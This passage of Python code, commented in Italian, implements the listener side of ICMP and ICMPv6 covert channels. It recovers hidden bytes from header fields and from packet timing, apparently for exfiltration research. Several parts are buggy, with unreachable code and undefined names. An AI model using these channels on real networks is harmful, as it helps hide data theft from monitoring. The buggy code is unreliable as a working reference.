                    self.data.append(inner_ip.id.to_bytes(2,"big").decode())  
                    self.data.append(inner_ip.ttl.to_bytes(2,"big").decode())  
                    #
                    self.data.append(inner_ip[ICMP].id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip[ICMP].seq.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
            #---------------------------------------------------
            if not (IS_TYPE.ipaddress(self.ip_dst) and IS_TYPE.list(self.data)): 
                raise Exception(f"Argoemnti non corretti") 
            source_quench_data=[] 
            TYPE_SOURCE_QUENCH=4 
            args={
                    "filter": get_filter()
                    #,"count":1 
                    ,"prn": callback()
                    #,"store":True 
                    ,"iface":self.interface
            } 
            try: 
                sniffer,pkt_timer=SNIFFER.sniff_packet(
                    args
                    ,None
                    ,lambda: SNIFFER.template_timeout(self.event_pktconn)
                ) 
                THREADING_EVENT.wait(self.event_pktconn) 
            except Exception as e:
                raise Exception(f"wait_conn_from_attacker: {e}")
            SNIFFER.stop(sniffer)
            if TIMER.stop(pkt_timer): 
                joined="".join(self.data)
                cleaned="".join(x for x in joined if x in string.printable)
                self.data=cleaned  
                return True 
            return False  

    class IPV4_PARAMETER_PROBLEM: #FUNZIONA BENE SIA SENZA CHE CON CAMPO UNUSED?
        event_pktconn=None
        ip_dst=None
        host_attivi=None
        interface=None
        data=None

        def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None):
            if not IS_TYPE.ipaddress(ip_dst): 
                raise Exception("IP destinazione non valido") 
            if host_attivi and not IS_TYPE.ipaddress(host_attivi): 
                raise Exception("IP mittente non valido")
            self.event_pktconn=GET.threading_Event() 
            try:  
                self.interface= NETWORK.DEFAULT_INTERFACE().default_iface  
            except Exception as e:
                raise Exception(f"IPV4_INFORMATION_REQUEST: {e}") 
            self.data=[]
            self.ip_dst=ip_dst
            self.host_attivi=host_attivi 
        
        def wait(self): 
            def get_filter():
                nonlocal self 
                filter= f"icmp and (icmp[0]=={TYPE_PARAMETER_PROBLEM}) and dst {self.ip_dst.compressed}" 
                if self.host_attivi and IS_TYPE.ipaddress(self.host_attivi): 
                    filter+=f" and src {self.host_attivi.compressed}" 
                else: print("No need to listen for the source")
                return filter 
                filter="icmp"
                filter=filter+f" and (icmp[0]=={TYPE_INFORMATION_REQUEST} or icmp[0]=={TYPE_INFORMATION_REPLY})"
                filter=filter+f" and dst {self.ip_dst.compressed}"
                if IS_TYPE.list(self.host_attivi): 
                    filter+=f" and ("
                    for IPindex in range(len(self.host_attivi)): 
                        if IS_TYPE.ipaddress(self.host_attivi[IPindex]): 
                            if IPindex>0: 
                                filter+=" or "
                            filter+=f" src {self.host_attivi[IPindex].compressed}"
                    filter+=f")"
                else: print("No need to listen for the source")
                print("FILTRO: ", filter)
                return filter
            def callback(packet):  
                nonlocal self
                TYPE_PARAMETER_PROBLEM=12 
                if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
                    #print(f"Callbak 'v4_parameter_problem' arrived packet: {packet.summary()}")
                    inner_ip = IP(packet[Raw].load)
                    if inner_ip[ICMP].id==0 and inner_ip[ICMP].seq==1: 
                        THREADING_EVENT.set(self.event_pktconn)
                        return  
                    self.data.append(packet[ICMP].ptr.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00'))
                    self.data.append(packet[ICMP].unused.to_bytes(3,"big").decode().lstrip('\x00').rstrip('\x00'))
                    #
                    self.data.append(inner_ip[IP].len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip[IP].id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip[IP].ttl.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    #
                    self.data.append(inner_ip[ICMP].id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip[ICMP].seq.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))                                 
            #---------------------------------------------------
            if not (IS_TYPE.ipaddress(self.ip_dst) and IS_TYPE.list(self.data)): 
                raise Exception(f"Argomenti non corretti") 
            TYPE_PARAMETER_PROBLEM=12 
            args={
                    "filter": get_filter()
                    #,"count":1 
                    ,"prn": callback
                    #,"store":True 
                    ,"iface":self.interface
            } 
            try: 
                sniffer,pkt_timer=SNIFFER.sniff_packet(
                    args
                    ,None
                    ,lambda: SNIFFER.template_timeout(self.event_pktconn)
                )   
                THREADING_EVENT.wait(self.event_pktconn) 
            except Exception as e:
                raise Exception(f"wait_conn_from_attacker: {e}")
            SNIFFER.stop(sniffer)
            if TIMER.stop(pkt_timer):    
                joined="".join(self.data)
                cleaned="".join(x for x in joined if x in string.printable)
                self.data=cleaned 
                return True 
            return False  

    class IPV4_TIME_EXCEEDED: #FUNZIONA BENE SIA SENZA CHE CON CAMPO UNUSED?
        event_pktconn=None
        ip_dst=None
        host_attivi=None
        interface=None
        data=None

        def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None):
            if not IS_TYPE.ipaddress(ip_dst): 
                raise Exception("IP destinazione non valido") 
            if host_attivi and not IS_TYPE.ipaddress(host_attivi): 
                raise Exception("IP mittente non valido")
            self.event_pktconn=GET.threading_Event() 
            try:  
                self.interface= NETWORK.DEFAULT_INTERFACE().default_iface  
            except Exception as e:
                raise Exception(f"IPV4_INFORMATION_REQUEST: {e}") 
            self.data=[]
            self.ip_dst=ip_dst
            self.host_attivi=host_attivi  
        
        def wait(self): 
            def get_filter():
                nonlocal self 
                filter= f"icmp and (icmp[0]=={TYPE_TIME_EXCEEDED}) and dst {self.ip_dst.compressed}" 
                if IS_TYPE.ipaddress(self.host_attivi): 
                    filter+=f" and src {self.host_attivi.compressed}"
                else: print("No need to listen for the source")
                return filter 
                filter="icmp"
                filter=filter+f" and (icmp[0]=={TYPE_INFORMATION_REQUEST} or icmp[0]=={TYPE_INFORMATION_REPLY})"
                filter=filter+f" and dst {self.ip_dst.compressed}"
                if IS_TYPE.list(self.host_attivi): 
                    filter+=f" and ("
                    for IPindex in range(len(self.host_attivi)): 
                        if IS_TYPE.ipaddress(self.host_attivi[IPindex]): 
                            if IPindex>0: 
                                filter+=" or "
                            filter+=f" src {self.host_attivi[IPindex].compressed}"
                    filter+=f")"
                else: print("No need to listen for the source")
                print("FILTRO: ", filter)
                return filter
            def callback(packet):  
                nonlocal self
                TYPE_TIME_EXCEEDED=11 
                if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
                    #print(f"Callbak 'v4_parameter_problem' arrived packet: {packet.summary()}")
                    inner_ip = IP(packet[Raw].load)
                    if inner_ip[ICMP].id==0 and inner_ip[ICMP].seq==1: 
                        THREADING_EVENT.set(self.event_pktconn)
                        return  
                    self.data.append(packet[ICMP].unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00'))
                    #
                    self.data.append(inner_ip[IP].len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip[IP].id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip[IP].ttl.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    #
                    self.data.append(inner_ip[ICMP].id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip[ICMP].seq.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))                   
            #---------------------------------------------------
            if not (IS_TYPE.ipaddress(self.ip_dst) and IS_TYPE.list(self.data)): 
                raise Exception(f"Argoementi non corretti")  
            TYPE_TIME_EXCEEDED=11 
            args={
                    "filter": get_filter()
                    #,"count":1 
                    ,"prn":  callback()
                    #,"store":True 
                    ,"iface":self.interface
            } 
            try: 
                sniffer,pkt_timer=SNIFFER.sniff_packet(
                    args
                    ,None
                    ,lambda: SNIFFER.template_timeout(self.event_pktconn)
                ) 
                THREADING_EVENT.wait(self.event_pktconn) 
            except Exception as e: 
                raise Exception(f"wait_conn_from_attacker: {e}")
            SNIFFER.stop(sniffer)
            if TIMER.stop(pkt_timer): 
                joined="".join(self.data)
                cleaned="".join(x for x in joined if x in string.printable)
                self.data=cleaned  
                return True 
            return False  

    class IPV4_DESTINATION_UNRECHABLE: #FUNZIONA BENE SIA SENZA CHE CON CAMPO UNUSED?
        event_pktconn=None
        ip_dst=None
        host_attivi=None
        interface=None
        data=None

        def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:list[ipaddress.IPv4Address]=None):
            if not (IS_TYPE.ipaddress(ip_dst) and IS_TYPE.list(host_attivi)): 
                raise Exception("Argomenti non validi") 
            if len(host_attivi)>=0 or not IS_TYPE.ipaddress(host_attivi[0]):
                raise Exception("List degli host attivi non valida")
            self.event_pktconn=GET.threading_Event() 
            try:  
                self.interface= NETWORK.DEFAULT_INTERFACE().default_iface  
            except Exception as e:
                raise Exception(f"IPV4_INFORMATION_REQUEST: {e}") 
            self.data=[]
            self.ip_dst=ip_dst
            self.host_attivi=host_attivi 
        
        def wait(self): 
            def get_filter():
                nonlocal self, TYPE_DESTINATION_UNREACHABLE
                filter= f"icmp and (icmp[0]=={TYPE_DESTINATION_UNREACHABLE}) and dst {self.ip_dst.compressed}"
                if self.host_attivi and IS_TYPE.ipaddress(self.host_attivi): 
                    filter+=f" and src {self.host_attivi.compressed}"
                else: print("No need to listen for the source")
                return filter 
                filter="icmp"
                filter=filter+f" and (icmp[0]=={TYPE_INFORMATION_REQUEST} or icmp[0]=={TYPE_INFORMATION_REPLY})"
                filter=filter+f" and dst {self.ip_dst.compressed}"
                if IS_TYPE.list(self.host_attivi): 
                    filter+=f" and ("
                    for IPindex in range(len(self.host_attivi)): 
                        if IS_TYPE.ipaddress(self.host_attivi[IPindex]): 
                            if IPindex>0: 
                                filter+=" or "
                            filter+=f" src {self.host_attivi[IPindex].compressed}"
                    filter+=f")"
                else: print("No need to listen for the source")
                print("FILTRO: ", filter)
                return filter
            def callback(packet): 
                nonlocal self
                TYPE_DESTINATION_UNREACHABLE=3 
                print(packet.summary)
                if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):  
                    inner_ip = IP(packet[Raw].load) 
                    if inner_ip[ICMP].id==0 and inner_ip[ICMP].seq==1: 
                        THREADING_EVENT.set(self.event_pktconn)
                        return 
                    self.data.append(packet[ICMP].unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00'))
                    #
                    self.data.append(inner_ip[IP].len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip[IP].id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip[IP].ttl.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    #
                    self.data.append(inner_ip[ICMP].id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip[ICMP].seq.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
            #---------------------------------------------------
            if not (IS_TYPE.ipaddress(self.ip_dst) and IS_TYPE.list(self.data)): 
                raise Exception(f"Argomenti non corretti") 
            TYPE_DESTINATION_UNREACHABLE=3 
            args={
                    "filter": get_filter() 
                    #,"count":1 
                    ,"prn": callback
                    #,"store":True 
                    ,"iface":self.interface 
            } 
            try: 
                sniffer,pkt_timer=SNIFFER.sniff_packet(
                    args
                    ,None
                    ,lambda: SNIFFER.template_timeout(self.event_pktconn)
                ) 
            except Exception as e:
                raise Exception(f"wait_conn_from_attacker: {e}")
            THREADING_EVENT.wait(self.event_pktconn)  
            SNIFFER.stop(sniffer)
            if TIMER.stop(pkt_timer):  
                joined="".join(self.data)
                cleaned="".join(x for x in joined if x in string.printable)
                self.data=cleaned  
                return True 
            return False  
    
    class IPV4_ECHO: 
        event_pktconn=None
        ip_dst=None
        host_attivi=None
        interface=None
        data=None   
        
        def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None):
            if not IS_TYPE.ipaddress(ip_dst): 
                raise Exception("IP destinazione non valido") 
            if host_attivi and not IS_TYPE.ipaddress(host_attivi): 
                raise Exception("IP mittente non valido")
            self.event_pktconn=GET.threading_Event() 
            try:  
                self.interface= NETWORK.DEFAULT_INTERFACE().default_iface  
            except Exception as e:
                raise Exception(f"IPV4_INFORMATION_REQUEST: {e}") 
            self.data=[]
            self.ip_dst=ip_dst
            self.host_attivi=host_attivi 

        def wait(self): 
            def get_filter():
                nonlocal self, TYPE_ECHO_REQUEST, TYPE_ECHO_REPLY
                filter="icmp" 
                filter= f" and (icmp[0]=={TYPE_ECHO_REQUEST} or icmp[0]=={TYPE_ECHO_REPLY}) " 
                filter=filter+f" and dst {self.ip_dst.compressed}"
                if IS_TYPE.list(self.host_attivi): 
                    filter+=f" and ("
                    for IPindex in range(len(self.host_attivi)): 
                        if IS_TYPE.ipaddress(self.host_attivi[IPindex]): 
                            if IPindex>0: 
                                filter+=" or "
                            filter+=f" src {self.host_attivi[IPindex].compressed}"
                    filter+=f")"
                else: print("No need to listen for the source")
                return filter  
            def callback(packet): 
                nonlocal self, TYPE_ECHO_REQUEST, TYPE_ECHO_REPLY
                if packet.haslayer(IP) and packet.haslayer(ICMP): 
                    if packet[ICMP].id==0 and packet[ICMP].seq==1: 
                        THREADING_EVENT.set(self.event_pktconn)
                        return                           
                    icmp_id=packet[ICMP].id
                    byte1 = (icmp_id >> 8) & 0xFF 
                    byte2 = icmp_id & 0xFF 
                    self.data.append(chr(byte1)+chr(byte2)) 
                    if packet.haslayer(Raw) : 
                        self.data.append(packet[Raw].load.decode()) 
                    else: print("Pacchetto non ha livello IP error\t",packet.summary())
            #---------------------------------------------------------
            if not (IS_TYPE.ipaddress(self.ip_dst) and IS_TYPE.list(self.data)): 
                raise Exception(f"ipv4_redirect: Argomenti non corretti") 
            TYPE_ECHO_REQUEST=8
            TYPE_ECHO_REPLY=0
            args={
                    "filter": get_filter()
                    #,"count":1 
                    ,"prn": callback
                    #,"store":True 
                    ,"iface":self.interface
            } 
            try: 
                sniffer,pkt_timer=SNIFFER.sniff_packet(
                    args
                    ,None
                    ,lambda: SNIFFER.template_timeout(self.event_pktconn)
                ) 
                THREADING_EVENT.wait(self.event_pktconn) 
            except Exception as e:
                raise Exception(f"wait_conn_from_attacker: {e}")
            SNIFFER.stop(sniffer)
            if TIMER.stop(pkt_timer): 
                joined="".join(self.data)
                cleaned="".join(x for x in joined if x in string.printable)
                self.data=cleaned 
                return True 
            return False  

    #SINO A QUI 
    class IPV4_TIMING: 
        event_pktconn=None
        ip_dst=None
        host_attivi=None
        interface=None
        data=None
        timeout_callback=None
        timer=None 

        def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None):
            if not IS_TYPE.ipaddress(ip_dst): 
                raise Exception("IP destinazione non valido") 
            if host_attivi and not IS_TYPE.ipaddress(host_attivi): 
                raise Exception("IP mittente non valido")
            self.event_pktconn=GET.threading_Event() 
            try:  
                self.interface= NETWORK.DEFAULT_INTERFACE().default_iface  
            except Exception as e:
                raise Exception(f"IPV4_INFORMATION_REQUEST: {e}") 
            self.data=[]
            self.ip_dst=ip_dst
            self.host_attivi=host_attivi 
            self.timeout_timer_callback=self.timeout_timer_callback() 
        
        def timeout_timer_callback(self): 
            THREADING_EVENT.set(self.event_pktconn)
            return 
        
        def return_calback(self, timing_data=[],previous_time=None, numero_bit=0 ): 
            if numero_bit<=0: 
                return None 
            DISTANZA_TEMPI=2 #sec
            dict_tempi={}
            dict_tempi.update( [("TEMPO_"+str(index), 3+index*2*DISTANZA_TEMPI)  for index in range(2**numero_bit)])
            dict_bit={ }
            dict_bit.update([ ("TEMPO_"+str(index), index)  for index in range(2**numero_bit) ])  

            MINUTE_TIME=0*60+30 #minuti
            MAX_TIME=max([value for _,value in dict_tempi.items()])+5 
        
            def callback(packet):
                nonlocal previous_time, timing_data
                nonlocal MAX_TIME, MINUTE_TIME  
                if previous_time is None: 
                    previous_time=packet.time 
                    self.timer.cancel()
                    self.timer=GET.timer(MAX_TIME, self.timeout_timer_callback) 
                    self.timer.start() 
                    return  
                if packet.time is not None: 
                    delta_time=packet.time-previous_time   
                    arr=arr=[(key, abs(delta_time-value)) for key,value in dict_tempi.items()] 
                    min_value=min([y for _,y in arr]) 
                    min_indices = [i for i, v in enumerate(arr) if v[1] == min_value] 
                    timing_data.append(dict_bit.get(arr[min_indices[0]][0]))
                    previous_time=packet.time
                    self.timer.cancel() 
                    if len(timing_data)%8==0: 
                        self.timer=GET.timer(MINUTE_TIME,self.timeout_timer_callback) 
                    else:
                        self.timer=GET.timer(MAX_TIME,self.timeout_timer_callback) 
                    self.timer.start()
            return callback
        
        def ipv4_timing_cc(self, numero_bit=0): 
            def get_filter():
                nonlocal self 
                filter=f"icmp and (icmp[0]=={TYPE_ECHO_REQUEST} or icmp[0]=={TYPE_ECHO_REPLY}) and dst {self.ip_dst.compressed}"
                if IS_TYPE.ipaddress(self.host_attivi): 
                    filter+=f" and src {self.host_attivi.compressed}" 
                else: print("No need to listen for the source")
                return filter 
            def callback(packet):  
                pass                 
            #---------------------------------------------------
            if not (IS_TYPE.ipaddress(self.ip_dst) and IS_TYPE.list(self.data)): 
                raise Exception(f"ipv4_timing_cc: Argoemnti non corretti")
            if numero_bit<=0:
                raise Exception("ipv4_timing_cc: Numero di bit passato non valido") 
            interface= NETWORK.DEFAULT_INTERFACE().default_iface 
            TYPE_ECHO_REQUEST=8
            TYPE_ECHO_REPLY=0 
            last_packet_time=None 
            args={
                    "filter": get_filter() 
                    #,"count":1 
                    ,"prn":  self.return_calback(
                        self.data
                        ,last_packet_time
                        ,numero_bit
                    )
                    #,"store":True 
                    ,"iface":interface
            }  
            try: 
                sniffer,pkt_timer=SNIFFER.sniff_packet(
                    args
                    ,None
                    ,lambda: SNIFFER.template_timeout(self.event_pktconn)
                )  
                THREADING_EVENT.wait(self.event_pktconn) 
                str_data=""
                for integer in self.timing_data:
                    str_data+=format(integer, f'0{numero_bit}b') 
                raw_data="" 
                for index in range(0, len(str_data), 8):
                    int_data=0
                    for bit in str_data[index:index+8][::-1]:
                        int_data=int_data<<1|int(bit)
                    raw_data+=chr(int_data) 
            except Exception as e:
                raise Exception(f"wait_conn_from_attacker: {e}")
            SNIFFER.stop(sniffer)
            if TIMER.stop(pkt_timer):  
                joined="".join(raw_data)
                cleaned="".join(x for x in joined if x in string.printable)
                self.data=cleaned  
                return True 
            return False

    class IPV4_TIMING_8BIT: 
        event_pktconn=None
        ip_dst=None
        host_attivi=None
        interface=None
        data=None
        timeout_callback=None
        timer=None 
        min_delay=None 
        max_delay=None 
        stop_value=None 

        def __init__(self, ip_dst:ipaddress.IPv4Address=None, host_attivi:ipaddress.IPv4Address=None, min_delay:int=1, max_delay:int=30, stop_value: int = 255):
            if not IS_TYPE.ipaddress(ip_dst): 
                raise Exception("IP destinazione non valido") 
            if host_attivi and not IS_TYPE.ipaddress(host_attivi): 
                raise Exception("IP mittente non valido")
            self.event_pktconn=GET.threading_Event() 
            try:  
                self.interface= NETWORK.DEFAULT_INTERFACE().default_iface  
            except Exception as e:
                raise Exception(f"IPV4_INFORMATION_REQUEST: {e}") 
            self.data=[]
            self.ip_dst=ip_dst
            self.host_attivi=host_attivi 
            self.timeout_timer_callback=self.timeout_timer_callback() 
            self.min_delay=min_delay 
            self.max_delay=max_delay 
            self.stop_value=stop_value
        
        def wait(self): 
            def decode_byte(delay): 
                #(byte/255)=(delay-min_delay)/(max_delay-min_delay) 
                frazione = (delay - self.min_delay) / (self.max_delay - self.min_delay) 
                byte=int(round(frazione*255)) 
                return byte  
            def callback_timing_channel8bit(pkt): 
                nonlocal previous_time, start_time, end_time 
                if pkt.haslayer("ICMP") and (pkt[ICMP].type==8 or pkt[ICMP].type==0): 
                    #current_time=datetime.datetime.now() 
                    #current_time=time.perf_counter() 
                    current_time=pkt.time 
                    if previous_time is not None: 
                        delta=(current_time-previous_time) 
                    byte=decode_byte(delta) 
                    print(f"Delta:{delta}\tByte:{byte} Char:{chr(byte)}") 
                    received_data.append(chr(byte)) 
                    if byte==self.stop_value: 
                        stop_flag["value"]=True 
                        end_time=pkt.time 
                    else: start_time=pkt.time 
                    previous_time=current_time 
            def stop_filter(pkt): 
                return stop_flag["value"] 
            #---------------------------------------------------
            if not (IS_TYPE.ipaddress(self.ip_dst) and IS_TYPE.integer(self.min_delay) and IS_TYPE.integer(self.max_delay) and IS_TYPE.integer(self.stop_value)):
                raise Exception("test_timing_channel8bit: Argomenti non validi") 
            if self.min_delay<=0: 
                raise Exception("Valori negativi o nulli non sono accettati")
            if self.max_delay<=self.min_delay: 
                raise Exception("Il vlaore masismo non può essere minore di quello minimo") 
            if not (0<=self.stop_value <=255): 
                raise Exception("Valore stop value non corretto")
            start_time=end_time=previous_time=None 
            stop_flag={"value":False} 
            print("In ascolto dei pacchetti ICMP...")
            sniff(
                filter=f"icmp and dst host {self.ip_dst.compressed}" 
                ,prn=callback_timing_channel8bit 
                ,store=False 
                ,stop_filter=stop_filter 
            )  
            received_data="".join(x for x in received_data) 
            print(f"Tempo di esecuzione: {end_time-start_time}") 
        
    class IPV4_TIMING_8BIT_NOISE: 
        event_pktconn=None
        ip_dst=None
        host_attivi=None
        interface=None
        data=None
        timeout_callback=None
        timer=None 
        min_delay=None 
        max_delay=None 
        stop_value=None 
        rumore=None 
        seed=None

        def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None, min_delay:int=1, max_delay:int=30, stop_value: int = 255, rumore:int=2, seed:int=4582):
            if not IS_TYPE.ipaddress(ip_dst): 
                raise Exception("IP destinazione non valido") 
            if self.host_attivi and not IS_TYPE.ipaddress(self.host_attivi): 
                raise Exception("IP mittente non valido")
            self.event_pktconn=GET.threading_Event() 
            try:  
                self.interface= NETWORK.DEFAULT_INTERFACE().default_iface  
            except Exception as e:
                raise Exception(f"IPV4_INFORMATION_REQUEST: {e}") 
            self.data=[]
            self.ip_dst=ip_dst
            self.host_attivi=host_attivi 
            self.timeout_timer_callback=self.timeout_timer_callback() 
            self.min_delay=min_delay 
            self.max_delay=max_delay 
            self.stop_value=stop_value 
            self.rumore=rumore
            self.seed=seed
        
        def wait(self): 
            def decode_byte(delay): 
                #(byte/255)=(delay-min_delay)/(max_delay-min_delay) 
                frazione = (delay - min_delay) / (max_delay - min_delay) 
                byte=int(round(frazione*255)) 
                byte = max(0, min(255, byte))
                return byte 
            def callback_timing_channel8bit(pkt): 
                nonlocal current_time, previous_time, start_time, end_time 
                if pkt.haslayer("ICMP") and pkt.haslayer("Raw") and (pkt[ICMP].type==8 or pkt[ICMP].type==0): 
                    #current_time=datetime.datetime.now() 
                    #current_time=time.perf_counter() 
                    current_time=pkt.time 
                    if previous_time is None:
                        start_time= previous_time = current_time 
                    return 
                    random_delay = int.from_bytes(pkt[Raw].load, byteorder='big', signed=True)
                    #random_delay = random.randint(-rumore, rumore)
                    delay=(current_time-previous_time)-random_delay
                    print("This Delay:", delay,"Random delay:", random_delay, "Send Delay" ,delay-random_delay)
                    byte=decode_byte(delay) 
                    print(f"Delta:{delay}\tByte:{byte} Char:{chr(byte)}") 
                    received_data.append(chr(byte))

                    previous_time=current_time
                    
                    if byte==stop_value: 
                        stop_flag["value"]=True 
                    end_time=pkt.time 
            def stop_filter(pkt): 
                return stop_flag["value"] 
            #---------------------------------------------------
            if not (IS_TYPE.ipaddress(self.ip_dst) and IS_TYPE.integer(self.rumore) and IS_TYPE.integer(self.min_delay) and IS_TYPE.integer(self.max_delay) and IS_TYPE.integer(self.stop_value) and IS_TYPE.integer(self.seed)):
                raise Exception("test_timing_channel8bit: Argomenti non validi") 
            if min_delay<=0: 
                raise Exception(f"test_timing_channel8bit: Valore minimo non accettato: {min_delay}")
            if max_delay<=min_delay: 
                raise Exception(f"test_timing_channel8bit: Il valore masismo non può essere minore di quello minimo") 
            if not (0<=self.stop_value <=255): 
                raise Exception(f"test_timing_channel8bit: Valore stop value non corretto: {self.stop_value}") 
            min_delay+=self.rumore
            max_delay+=self.rumore

            start_time=end_time=None 
            current_time=previous_time=None 
            stop_flag={"value":False}  
            random.seed(self.seed)                 
            print("In ascolto dei pacchetti ICMP...")
            sniff(
                filter=f"icmp and dst host {self.ip_dst.compressed}" 
                ,prn=callback_timing_channel8bit 
                ,store=False 
                ,stop_filter=stop_filter 
            )  
            received_data="".join(x for x in received_data) 
            print(f"Tempo di esecuzione: {end_time-start_time}") 
    
    
    class IPV6_INFORMATION_REQUEST: 
        event_pktconn=None
        ip_dst=None
        host_attivi=None
        interface=None
        data=None 

        def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None):
            if not IS_TYPE.ipaddress(ip_dst): 
                raise Exception("IP destinazione non valido") 
            if host_attivi and not IS_TYPE.ipaddress(host_attivi): 
                raise Exception("IP mittente non valido")
            self.event_pktconn=GET.threading_Event() 
            try:  
                self.interface= NETWORK.DEFAULT_INTERFACE().default_iface  
            except Exception as e:
                raise Exception(f"IPV4_INFORMATION_REQUEST: {e}") 
            self.data=[]
            self.ip_dst=ip_dst
            self.host_attivi=host_attivi

        def return_calback(self):
            def callback(packet): 
                nonlocal self
                if packet.haslayer(IPv6) and (packet.haslayer(ICMPv6EchoReply) or packet.haslayer(ICMPv6EchoRequest)):  
                    icmp_echo_type=(
                        "ICMPv6EchoReply" if packet.haslayer(ICMPv6EchoReply) 
                        else "ICMPv6EchoRequest" if packet.haslayer(ICMPv6EchoRequest) 
                        else None
                    ) 
                    if packet[icmp_echo_type].id==0 and packet[icmp_echo_type].seq==1: 
                        THREADING_EVENT.set(self.event_pktconn)
                        return
                    icmp_id=packet[icmp_echo_type].id
                    byte1 = (icmp_id >> 8) & 0xFF 
                    byte2 = icmp_id & 0xFF 
                    self.data.extend([chr(byte1),chr(byte2)]) 
            return callback 

        def wait(self): 
            def get_filter():
                nonlocal self, TYPE_INFORMATION_REQUEST, TYPE_INFORMATION_REPLY
                filter= f"icmp6 and (icmp6[0]=={TYPE_INFORMATION_REQUEST} or icmp6[0]=={TYPE_INFORMATION_REPLY}) and dst {self.ip_dst.compressed}"
                if IS_TYPE.ipaddress(self.host_attivi): 
                    filter+=f" and src {self.host_attivi.compressed}" 
                return filter 
            def callback(packet): 
                nonlocal self
                if packet.haslayer(IPv6) and (packet.haslayer(ICMPv6EchoReply) or packet.haslayer(ICMPv6EchoRequest)):  
                    icmp_echo_type=(
                        "ICMPv6EchoReply" if packet.haslayer(ICMPv6EchoReply) 
                        else "ICMPv6EchoRequest" if packet.haslayer(ICMPv6EchoRequest) 
                        else None
                    ) 
                    if packet[icmp_echo_type].id==0 and packet[icmp_echo_type].seq==1: 
                        THREADING_EVENT.set(self.event_pktconn)
                        return
                    icmp_id=packet[icmp_echo_type].id
                    byte1 = (icmp_id >> 8) & 0xFF 
                    byte2 = icmp_id & 0xFF 
                    self.data.extend([chr(byte1),chr(byte2)]) 
            #---------------------------------------------------
            if not IS_TYPE.ipaddress(self.ip_dst) or not IS_TYPE.list(self.data): 
                raise Exception(f"Argoemnti non corretti") 
            TYPE_INFORMATION_REQUEST=128
            TYPE_INFORMATION_REPLY=129  
            #ip_google=socket.getaddrinfo("www.google.com", None, socket.AF_UNSPEC)
            #print("IP_GOOGLE: ",ip_google) 
            args={
                    "filter": get_filter()
                    #,"count":1 
                    ,"prn":  callback()
                    #,"store":True 
                    ,"iface": self.interface
                }
            try: 
                sniffer,pkt_timer=SNIFFER.sniff_packet(
                    args
                    ,None
                    ,lambda: SNIFFER.template_timeout(self.event_pktconn)
                ) 
                THREADING_EVENT.wait(self.event_pktconn) 
            except Exception as e:
                raise Exception(f"get_information_request: {e}")
            SNIFFER.stop(sniffer)
            if TIMER.stop(pkt_timer): 
                joined="".join(self.data)
                cleaned="".join(x for x in joined if x in string.printable)
                self.data=cleaned 
                return True 
            return False  

    class IPV6_PARAMETER_PROBLEM: 
        event_pktconn=None
        ip_dst=None
        host_attivi=None
        interface=None
        data=None 

        def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None):
            if not IS_TYPE.ipaddress(ip_dst): 
                raise Exception("IP destinazione non valido") 
            if host_attivi and not IS_TYPE.ipaddress(host_attivi): 
                raise Exception("IP mittente non valido")
            self.event_pktconn=GET.threading_Event() 
            try:  
                self.interface= NETWORK.DEFAULT_INTERFACE().default_iface  
            except Exception as e:
                raise Exception(f"IPV4_INFORMATION_REQUEST: {e}") 
            self.data=[]
            self.ip_dst=ip_dst
            self.host_attivi=host_attivi 
        
        def return_calback(self): 
            #TYPE_INFORMATION_REPLY=129
            #TYPE_PARAMETER_PROBLEM=4  
            def callback(packet): 
                nonlocal self
                field=None 
                if (layer:=packet.getlayer("IPv6")) is not None:  
                    if (layer:=layer.getlayer("ICMPv6ParamProblem")) is not None: 
                        if (field:=layer.getfieldval("ptr")) is not None and field!=0xffffffff: 
                            self.data.append(field.to_bytes(4,"big").decode()) 
                        elif field is not None and field==0xffffffff: 
                            THREADING_EVENT.set(self.event_pktconn)
                            return 
                    if (layer:=layer.getlayer("IPerror6")) is not None: 
                        if (field:=layer.getfieldval("plen")) is not None: 
                            self.data.append(field.to_bytes(2,"big").decode())
                    layer=(
                        layer.getlayer("ICMPv6EchoRequest") if layer.getlayer("ICMPv6EchoReply") is None 
                        else layer.getlayer("ICMPv6EchoReply")
                    )
                    if layer is not None: 
                        if (field:=layer.getfieldval("id")) is not None: 
                            self.data.append(field.to_bytes(2,"big").decode()) 
            return callback
        
        def wait(self): 
            def get_filter():
